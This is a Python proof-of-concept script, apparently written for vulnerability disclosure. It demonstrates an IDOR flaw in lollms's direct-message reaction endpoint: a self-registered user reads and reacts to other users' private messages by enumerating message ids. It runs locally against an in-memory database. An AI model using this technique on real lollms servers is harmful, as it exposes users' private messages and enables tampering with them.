#!/usr/bin/env python3
"""
PoC — Broken object-level authorization (IDOR) in lollms
POST /api/dm/messages/{message_id}/reactions  (backend/routers/social/dm.py)

`toggle_dm_reaction` fetches the DirectMessage by primary-key id with NO check
that the caller is the sender, receiver, or a member of the conversation, then
returns the full message object (`DirectMessagePublic`, which includes
`content`). Any authenticated user can therefore:
  * READ the content of ANY private direct message on the server by enumerating
    the sequential integer message id (confidentiality break across all users), and
  * WRITE a reaction onto ANY message (integrity break).
Registration is open by default (`allow_new_registrations=True`), so an attacker
just self-registers first.

This runs the REAL, unmodified `toggle_dm_reaction` from the cloned HEAD source
against a throwaway in-memory SQLite database populated with the project's real
ORM models. The only stubbed dependency is `lollms_client` (a heavy LLM library
that the DM code path never touches) and the websocket broadcast (a no-op here).

Run:
    LOLLMS_SRC=/path/to/lollms-src \
    PYTHONPATH=$LOLLMS_SRC ./venv-lollms/bin/python poc_dm_reaction_idor.py
"""

import os
import sys
import types
import asyncio
import tempfile
import importlib.abc
import importlib.machinery


# --- Stub the heavy, DM-irrelevant lollms_client namespace ------------------
def _install_lollms_client_stub():
    def _swallow(*a, **k):
        return _Dummy()

    class _Meta(type):
        def __getattr__(cls, n):
            return _swallow

    class _Dummy(metaclass=_Meta):
        def __init__(self, *a, **k):
            pass

        def __getattr__(self, n):
            return _swallow

    class _Finder(importlib.abc.MetaPathFinder, importlib.abc.Loader):
        def find_spec(self, name, path=None, target=None):
            if name == "lollms_client" or name.startswith("lollms_client."):
                return importlib.machinery.ModuleSpec(name, self, is_package=True)
            return None

        def create_module(self, spec):
            m = types.ModuleType(spec.name)
            m.__path__ = []
            m.__getattr__ = lambda n: _Dummy
            return m

        def exec_module(self, module):
            pass

    sys.meta_path.insert(0, _Finder())


def main() -> int:
    _install_lollms_client_stub()

    src = os.environ.get("LOLLMS_SRC")
    if src and src not in sys.path:
        sys.path.insert(0, src)
    os.environ.setdefault("APP_DATA_DIR", tempfile.mkdtemp(prefix="lollms_poc_data_"))
    os.environ.setdefault("SECRET_KEY", "poc-secret-not-real")

    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    from backend.db.base import Base

    # Import EVERY model module so all relationship() targets (Skill, etc.)
    # resolve before the mapper is configured.
    import importlib
    import pkgutil
    import backend.db.models as models_pkg
    for _m in pkgutil.iter_modules(models_pkg.__path__):
        importlib.import_module(f"backend.db.models.{_m.name}")

    from backend.db.models.user import User as DBUser
    from backend.db.models.dm import DirectMessage as DBDirectMessage

    # Import the REAL vulnerable endpoint + its request model
    import backend.routers.social.dm as dm
    from backend.routers.social.dm import toggle_dm_reaction, MessageReactionRequest

    # Neutralize websocket side effects (irrelevant to the vuln)
    dm.manager.send_personal_message_sync = lambda *a, **k: None
    dm.manager.active_connections = {}

    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    db = Session()

    # Victims: alice and bob. Attacker: eve (a normal, unrelated account).
    alice = DBUser(username="alice", hashed_password="x")
    bob = DBUser(username="bob", hashed_password="x")
    eve = DBUser(username="eve", hashed_password="x")
    db.add_all([alice, bob, eve])
    db.commit()

    SECRET = "PRIVATE: my bank OTP is 738114 and my SSN is 555-01-2029"
    dm_msg = DBDirectMessage(
        sender_id=alice.id, receiver_id=bob.id, content=SECRET, reactions={}
    )
    db.add(dm_msg)
    db.commit()
    print(f"[i] Private DM #{dm_msg.id}: alice -> bob (attacker eve is NOT a party)")

    # Attacker principal: eve. The endpoint only reads current_user.id.
    eve_principal = types.SimpleNamespace(id=eve.id, username="eve", is_admin=False)

    print(f"[i] eve calls POST /api/dm/messages/{dm_msg.id}/reactions ...")
    resp = asyncio.run(
        toggle_dm_reaction(
            message_id=dm_msg.id,
            payload=MessageReactionRequest(emoji="🔥"),
            current_user=eve_principal,
            db=db,
        )
    )

    leaked = getattr(resp, "content", None)
    db.refresh(dm_msg)
    tampered = eve.id in (dm_msg.reactions or {}).get("🔥", [])

    print("\n--- RESPONSE RETURNED TO ATTACKER eve ---")
    print(f"  message_id      : {resp.id}")
    print(f"  sender_username : {resp.sender_username}")
    print(f"  receiver_username: {resp.receiver_username}")
    print(f"  content         : {leaked!r}")
    print(f"  reactions       : {dm_msg.reactions}")

    read_idor = leaked == SECRET
    print("\n=== VERDICT ===")
    print(f"  READ-IDOR  (eve read alice→bob private content): {'CONFIRMED' if read_idor else 'no'}")
    print(f"  WRITE-IDOR (eve wrote a reaction onto it)      : {'CONFIRMED' if tampered else 'no'}")
    if read_idor and tampered:
        print("\n*** IDOR CONFIRMED: any authenticated user reads/tampers with "
              "arbitrary private DMs by id. ***")
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
